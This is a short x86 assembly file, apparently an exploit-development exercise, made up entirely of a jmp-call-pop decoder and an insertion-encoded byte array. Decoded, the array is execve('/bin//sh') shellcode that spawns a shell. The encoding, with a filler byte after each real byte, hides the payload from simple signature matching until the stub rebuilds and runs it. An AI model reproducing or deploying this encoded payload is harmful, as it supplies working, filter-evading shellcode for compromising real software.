; Author: rbct

; Shellcode length: 25 bytes without the encoded shellcode

global _start

section .text

_start:

    jmp short CallDecodeShellcode

DecodeShellcode:

    pop esi

    xor ecx, ecx
    mov eax, esi

    ; copy into cl N-1
    ; where N is the number of bytes of the DECODED shellcode
    mov cl, 26

DecodeLoop:

    inc esi
    add al, 0x2
    mov bl, BYTE [eax]
    mov [esi], bl
    loop DecodeLoop

    jmp short shellcode

CallDecodeShellcode:

    call DecodeShellcode
    shellcode: db 0x31,0x21,0xc0,0x21,0x50,0x21,0x68,0x21,0x6e,0x21,0x2f,0x21,0x73,0x21,0x68,0x21,0x68,0x21,0x2f,0x21,0x2f,0x21,0x62,0x21,0x69,0x21,0xb0,0x21,0x0b,0x21,0x89,0x21,0xe3,0x21,0x8d,0x21,0x4c,0x21,0x24,0x21,0x08,0x21,0x8d,0x21,0x54,0x21,0x24,0x21,0x08,0x21,0xcd,0x21,0x80,0x21